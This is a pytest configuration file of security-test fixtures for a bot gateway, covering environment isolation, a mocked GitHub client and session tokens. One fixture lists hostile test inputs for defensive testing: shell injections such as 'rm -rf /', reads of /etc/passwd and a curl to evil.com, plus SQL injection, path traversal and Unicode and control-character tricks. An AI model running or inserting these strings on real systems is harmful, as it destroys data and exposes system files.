"""
Pytest configuration for security tests.

Provides fixtures for security testing scenarios including:
- Mocked environment isolation
- Session/token generation helpers
- Policy engine test fixtures
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock

import pytest

# Add project paths to sys.path
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "shared"))
sys.path.insert(0, str(PROJECT_ROOT / "gateway"))


@pytest.fixture
def isolated_env(monkeypatch, tmp_path):
    """Create an isolated environment for security tests.

    Clears potentially sensitive environment variables and sets up
    a clean temporary directory structure.
    """
    # Clear potentially sensitive env vars
    sensitive_vars = [
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "ANTHROPIC_API_KEY",
        "ANTHROPIC_OAUTH_TOKEN",
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "EGG_LAUNCHER_SECRET",
    ]
    for var in sensitive_vars:
        monkeypatch.delenv(var, raising=False)

    # Set up required config for policy tests
    monkeypatch.setenv("GATEWAY_BOT_NAME", "james-in-a-box")
    monkeypatch.setenv("GATEWAY_BOT_BRANCH_PREFIX", "james-in-a-box")

    # Create test directory structure
    (tmp_path / "home").mkdir()
    (tmp_path / "repos").mkdir()
    monkeypatch.setenv("HOME", str(tmp_path / "home"))

    return tmp_path


@pytest.fixture
def mock_github_client():
    """Create a mock GitHub client for policy tests."""
    client = MagicMock()
    # Default: no PRs, branches don't exist
    client.list_prs_for_branch.return_value = []
    client.get_pr_info.return_value = None
    client.branch_exists.return_value = False
    return client


@pytest.fixture
def sample_session_tokens():
    """Generate sample session tokens for testing."""
    import secrets

    return [secrets.token_urlsafe(32) for _ in range(5)]


@pytest.fixture
def malicious_inputs():
    """Collection of malicious input strings for injection testing.

    Includes:
    - Shell injection attempts
    - Path traversal attempts
    - Unicode tricks
    - Control characters
    """
    return {
        "shell_injection": [
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "| cat /etc/passwd",
            "&& curl evil.com",
            "'; DROP TABLE users; --",
            "${IFS}cat${IFS}/etc/passwd",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
        ],
        "unicode_tricks": [
            "egg\u200b/feature",  # Zero-width space
            "egg\u2044feature",  # Fraction slash
            "egg\uff0ffeature",  # Fullwidth solidus
            "\u202eegg/feature",  # Right-to-left override
            "egg/\u0000feature",  # Null byte
        ],
        "control_chars": [
            "branch\x00name",  # Null byte
            "branch\nnewline",  # Newline injection
            "branch\rcarriage",  # Carriage return
            "branch\x1b[31mred",  # ANSI escape
            "branch\ttab",  # Tab
        ],
        "oversized": [
            "a" * 1000,  # Long string
            "a" * 10000,  # Very long string
            "🎉" * 1000,  # Long unicode
        ],
    }
